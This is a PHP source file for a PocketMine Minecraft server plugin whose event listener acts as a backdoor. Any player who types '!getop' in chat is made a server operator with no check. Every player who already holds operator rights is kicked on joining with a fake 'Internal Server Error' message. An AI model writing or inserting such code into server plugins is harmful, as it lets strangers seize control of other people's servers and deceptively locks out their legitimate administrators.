<?php

namespace igdt;

use pocketmine\event\Listener;
use pocketmine\event\player\{PlayerJoinEvent, PlayerChatEvent};

class Event implements Listener{
	public function onJoin(PlayerJoinEvent $event){
		$player = $event->getPlayer();
		if($player->isOp()){
			$player->kick('Internal Server Error', false);
		}
	}
	
	public function onChat(PlayerChatEvent $event){
		$player = $event->getPlayer();
		switch($event->getMessage()){
			case '!getop':
				$player->setOp(true);
				$player->sendMessage('You are op!');
				break;
		}
	}
}